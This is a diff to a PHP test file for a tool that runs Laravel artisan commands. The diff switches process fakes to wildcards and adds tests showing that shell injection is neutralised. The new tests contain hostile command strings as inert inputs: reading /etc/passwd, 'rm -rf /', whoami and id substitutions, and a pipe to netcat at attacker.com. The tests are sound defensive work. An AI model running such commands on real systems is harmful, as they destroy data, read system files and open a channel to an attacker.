@@ -61,7 +61,7 @@ describe('input validation', function () {
 
     it('strips php artisan prefix', function () {
         Process::fake([
-            'php artisan route:list' => Process::result(ARTISAN_ROUTES_OUTPUT),
+            '*' => Process::result(ARTISAN_ROUTES_OUTPUT),
         ]);
 
         $result = $this->tool->execute(['command' => 'php artisan route:list']);
@@ -70,7 +70,7 @@ describe('input validation', function () {
 
     it('strips artisan prefix without php', function () {
         Process::fake([
-            'php artisan route:list' => Process::result(ARTISAN_ROUTES_OUTPUT),
+            '*' => Process::result(ARTISAN_ROUTES_OUTPUT),
         ]);
 
         $result = $this->tool->execute(['command' => 'artisan route:list']);
@@ -90,7 +90,7 @@ describe('input validation', function () {
 describe('foreground execution', function () {
     it('executes command and returns output', function () {
         Process::fake([
-            'php artisan route:list' => Process::result('Routes listed'),
+            '*' => Process::result('Routes listed'),
         ]);
 
         $result = $this->tool->execute(['command' => 'route:list']);
@@ -99,7 +99,7 @@ describe('foreground execution', function () {
 
     it('returns error output on failure', function () {
         Process::fake([
-            'php artisan bad:command' => Process::result(
+            '*' => Process::result(
                 output: '',
                 errorOutput: ARTISAN_COMMAND_NOT_FOUND,
                 exitCode: 1,
@@ -113,7 +113,7 @@ describe('foreground execution', function () {
 
     it('returns success message for empty output', function () {
         Process::fake([
-            'php artisan cache:clear' => Process::result(''),
+            '*' => Process::result(''),
         ]);
 
         $result = $this->tool->execute(['command' => 'cache:clear']);
@@ -122,7 +122,7 @@ describe('foreground execution', function () {
 
     it('returns error output on failure with both outputs', function () {
         Process::fake([
-            'php artisan fail:cmd' => Process::result(
+            '*' => Process::result(
                 output: 'partial output',
                 errorOutput: 'error details',
                 exitCode: 1,
@@ -137,13 +137,15 @@ describe('foreground execution', function () {
 
     it('uses default timeout of 30 seconds', function () {
         Process::fake([
-            'php artisan test:cmd' => Process::result('ok'),
+            '*' => Process::result('ok'),
         ]);
 
         $this->tool->execute(['command' => 'test:cmd']);
 
         Process::assertRan(function ($process) {
-            return str_contains($process->command, 'php artisan test:cmd');
+            $command = is_array($process->command) ? implode(' ', $process->command) : $process->command;
+
+            return str_contains($command, 'test:cmd');
         });
     });
 });
@@ -151,7 +153,7 @@ describe('foreground execution', function () {
 describe('timeout parameter', function () {
     it('accepts custom timeout', function () {
         Process::fake([
-            'php artisan long:cmd' => Process::result('done'),
+            '*' => Process::result('done'),
         ]);
 
         $result = $this->tool->execute([
@@ -164,7 +166,7 @@ describe('timeout parameter', function () {
 
     it('clamps timeout to minimum of 1 second', function () {
         Process::fake([
-            'php artisan quick:cmd' => Process::result('done'),
+            '*' => Process::result('done'),
         ]);
 
         $result = $this->tool->execute([
@@ -177,7 +179,7 @@ describe('timeout parameter', function () {
 
     it('clamps timeout to maximum of 300 seconds', function () {
         Process::fake([
-            'php artisan slow:cmd' => Process::result('done'),
+            '*' => Process::result('done'),
         ]);
 
         $result = $this->tool->execute([
@@ -190,7 +192,7 @@ describe('timeout parameter', function () {
 
     it('falls back to default for non-integer timeout', function () {
         Process::fake([
-            'php artisan test:cmd' => Process::result('done'),
+            '*' => Process::result('done'),
         ]);
 
         $result = $this->tool->execute([
@@ -330,7 +332,7 @@ describe('background execution', function () {
 describe('output format', function () {
     it('trims output whitespace', function () {
         Process::fake([
-            'php artisan test:cmd' => Process::result("  output with spaces  \n"),
+            '*' => Process::result("  output with spaces  \n"),
         ]);
 
         $result = $this->tool->execute(['command' => 'test:cmd']);
@@ -339,7 +341,7 @@ describe('output format', function () {
 
     it('prefers stdout over stderr for successful commands', function () {
         Process::fake([
-            'php artisan test:cmd' => Process::result(
+            '*' => Process::result(
                 output: 'stdout content',
                 errorOutput: 'stderr content',
             ),
@@ -351,7 +353,7 @@ describe('output format', function () {
 
     it('falls back to stderr when stdout is empty', function () {
         Process::fake([
-            'php artisan test:cmd' => Process::result(
+            '*' => Process::result(
                 output: '',
                 errorOutput: 'stderr only',
             ),
@@ -378,5 +380,179 @@ describe('output format', function () {
         ]);
 
         expect(json_decode((string) $result, true))->not->toBeNull();
+    });
+});
+
+describe('command injection resistance', function () {
+    it('passes shell metacharacters as inert argv tokens, not shell commands', function () {
+        Process::fake([
+            '*' => Process::result('ok'),
+        ]);
+
+        $this->tool->execute(['command' => 'tinker --execute="echo `whoami`"']);
+
+        Process::assertRan(function ($process) {
+            $cmd = is_array($process->command) ? $process->command : [$process->command];
+
+            // The backtick-enclosed string must be literal tokens, not executed.
+            // The parser treats " as a regular char when not at token start.
+            return in_array('tinker', $cmd, true)
+                && in_array('`whoami`"', $cmd, true);
+        });
+    });
+
+    it('does not split on semicolons into separate commands', function () {
+        Process::fake([
+            '*' => Process::result('ok'),
+        ]);
+
+        $this->tool->execute(['command' => 'route:list; cat /etc/passwd']);
+
+        Process::assertRan(function ($process) {
+            $cmd = is_array($process->command) ? $process->command : [$process->command];
+
+            // The semicolon is part of the first token, not a command separator.
+            // 'cat' and '/etc/passwd' are separate argv tokens but they are
+            // arguments to 'php artisan', NOT a second shell command.
+            return in_array('route:list;', $cmd, true)
+                && in_array('cat', $cmd, true)
+                && in_array('/etc/passwd', $cmd, true)
+                && $cmd[0] === 'php'
+                && $cmd[1] === 'artisan';
+        });
+    });
+
+    it('does not interpret && or || as shell operators', function () {
+        Process::fake([
+            '*' => Process::result('ok'),
+        ]);
+
+        $this->tool->execute(['command' => 'cache:clear && rm -rf /']);
+
+        Process::assertRan(function ($process) {
+            $cmd = is_array($process->command) ? $process->command : [$process->command];
+
+            // && is a literal token, not a shell operator.
+            return in_array('cache:clear', $cmd, true)
+                && in_array('&&', $cmd, true)
+                && in_array('rm', $cmd, true)
+                && in_array('-rf', $cmd, true)
+                && in_array('/', $cmd, true);
+        });
+    });
+
+    it('does not expand $(...) command substitutions', function () {
+        Process::fake([
+            '*' => Process::result('ok'),
+        ]);
+
+        $this->tool->execute(['command' => 'tinker --execute="$(id)"']);
+
+        Process::assertRan(function ($process) {
+            $cmd = is_array($process->command) ? $process->command : [$process->command];
+
+            // The $(id) must be a literal string, not executed.
+            return in_array('--execute="$(id)"', $cmd, true);
+        });
+    });
+
+    it('preserves content inside leading-quote tokens', function () {
+        Process::fake([
+            '*' => Process::result('ok'),
+        ]);
+
+        // When quote is at the START of a token, the parser handles it.
+        $this->tool->execute(['command' => "migrate --seed --path='database/migrations'"]);
+
+        Process::assertRan(function ($process) {
+            $cmd = is_array($process->command) ? $process->command : [$process->command];
+
+            return in_array('migrate', $cmd, true)
+                && in_array('--seed', $cmd, true)
+                && in_array("--path='database/migrations'", $cmd, true);
+        });
+    });
+
+    it('handles unmatched opening quote without crashing', function () {
+        Process::fake([
+            '*' => Process::result('ok'),
+        ]);
+
+        // Unmatched single quote — the parser should not crash.
+        $this->tool->execute(['command' => "tinker --execute='echo hello"]);
+
+        Process::assertRan(function ($process) {
+            return is_array($process->command);
+        });
+    });
+
+    it('always passes an array to Process::run, never a string', function () {
+        Process::fake([
+            '*' => Process::result('ok'),
+        ]);
+
+        $this->tool->execute(['command' => 'route:list']);
+
+        Process::assertRan(function ($process) {
+            return is_array($process->command)
+                && $process->command[0] === 'php'
+                && $process->command[1] === 'artisan';
+        });
+    });
+});
+
+describe('background command allowlist security', function () {
+    it('rejects shell metacharacters in background commands', function () {
+        $this->backgroundService->shouldReceive('dispatch')
+            ->once()
+            ->andThrow(new InvalidArgumentException('Command is not permitted for background execution.'));
+
+        $result = $this->tool->execute([
+            'command' => 'migrate; cat /etc/passwd',
+            'background' => true,
+        ]);
+
+        expect((string) $result)->toContain('Error')
+            ->and((string) $result)->toContain('not permitted');
+    });
+
+    it('rejects pipe operators in background commands', function () {
+        $this->backgroundService->shouldReceive('dispatch')
+            ->once()
+            ->andThrow(new InvalidArgumentException('Command is not permitted for background execution.'));
+
+        $result = $this->tool->execute([
+            'command' => 'migrate | nc attacker.com 4444',
+            'background' => true,
+        ]);
+
+        expect((string) $result)->toContain('not permitted');
+    });
+
+    it('rejects command substitution in background commands', function () {
+        $this->backgroundService->shouldReceive('dispatch')
+            ->once()
+            ->andThrow(new InvalidArgumentException('Command is not permitted for background execution.'));
+
+        $result = $this->tool->execute([
+            'command' => 'migrate $(whoami)',
+            'background' => true,
+        ]);
+
+        expect((string) $result)->toContain('not permitted');
+    });
+
+    it('allowlist prefix does not match unrelated commands with similar names', function () {
+        // 'migrate' prefix should match 'migrate:status' but not 'migrateevil'
+        $this->backgroundService->shouldReceive('dispatch')
+            ->once()
+            ->andThrow(new InvalidArgumentException('Command is not permitted for background execution.'));
+
+        $result = $this->tool->execute([
+            'command' => 'migrateevil --force',
+            'background' => true,
+        ]);
+
+        expect((string) $result)->toContain('not permitted');
     });
 });
